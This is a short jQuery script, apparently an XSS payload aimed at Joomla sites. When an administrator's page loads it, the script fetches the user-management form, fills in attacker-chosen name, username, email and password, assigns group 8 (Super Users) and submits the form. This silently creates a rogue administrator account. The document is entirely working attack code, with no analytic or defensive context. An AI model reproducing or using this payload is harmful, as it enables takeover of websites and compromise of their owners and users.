$(document).ready(function(){
   $.get(userspage, function(data)
         {
			form=$(data).find('form#user-form');
			formurl = form.attr('action')
			if (typeof(formurl) == "undefined") 
			{
				notify('failed');
			}
			else
			{
				form.find('input#jform_name').val(name);
				form.find('input#jform_username').val(username);
				form.find('input#jform_email').val(email);
				form.find('input#jform_password').val(passwd);
				form.find('input#jform_password2').val(passwd); 
				form.find('input[name=jform\\[groups\\]\\[\\]]').val('8');
				form.find('input[name="task"]').val('user.apply');
	            formdata = form.serialize();
	            $.post(formurl, formdata, notify('worked'));
			}
		}).error(notify('failed'));
});